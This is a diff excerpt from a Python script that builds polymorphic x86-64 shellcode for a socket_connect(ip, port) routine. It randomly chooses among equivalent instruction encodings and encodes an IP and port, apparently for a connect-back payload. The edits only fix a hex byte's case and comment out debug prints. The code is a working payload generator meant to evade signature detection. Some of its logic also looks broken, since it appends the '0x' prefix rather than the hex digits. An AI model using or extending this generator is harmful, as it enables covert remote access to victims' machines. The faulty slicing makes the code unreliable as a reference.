@@ -124,7 +124,7 @@ def socket_connect(ip, port):
    l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
    PAYLOAD += l[r(0,len(l)-1)]   
    clean("rax")
-   PAYLOAD += "B02a" if r(0,1) else "042a"
+   PAYLOAD += "b02a" if r(0,1) else "042a"
    clean("rbx")
    PAYLOAD += "53" # push rbx
    ip_greater = []
@@ -140,14 +140,14 @@ def socket_connect(ip, port):
     for i in range(0,len(ip_greater)):
         if ip_greater[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_greater[i])[:2]
-        print(hex(ip_greater[i])[2:])
+        # print(hex(ip_greater[i])[2:])
 
 
     PAYLOAD += "83ee" # sub esi
     for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
-        print(hex(ip_to_substract[i])[2:])
+       # print(hex(ip_to_substract[i])[2:])
 
     #print(PAYLOAD)
     port = hex(socket.htons(int(port)))[:2]
